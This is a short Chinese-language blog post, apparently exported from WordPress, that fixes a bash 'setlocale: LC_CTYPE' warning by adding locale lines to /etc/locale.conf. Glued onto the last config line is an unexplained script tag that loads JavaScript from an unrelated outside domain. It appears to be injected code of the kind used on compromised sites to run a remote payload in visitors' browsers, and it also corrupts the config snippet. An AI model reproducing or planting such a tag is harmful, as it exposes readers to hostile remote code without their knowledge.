---
id: 43
title: '-bash: warning: setlocale: LC_CTYPE: cannot change locale (UTF-8): No such file or directory'
date: '2020-01-16T14:22:14+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=43'
permalink: /index.php/2020/01/16/bash-warning-setlocale-lc_ctype-cannot-change-locale-utf-8-no-such-file-or-directory/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

连接Linux报错-bash: warning: setlocale: LC\_CTYPE: cannot change locale (UTF-8): No such file or directory

修改文件/etc/locale.conf添加

LC\_CTYPE=en\_US.utf8  
LC\_ALL=en\_US.utf8<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>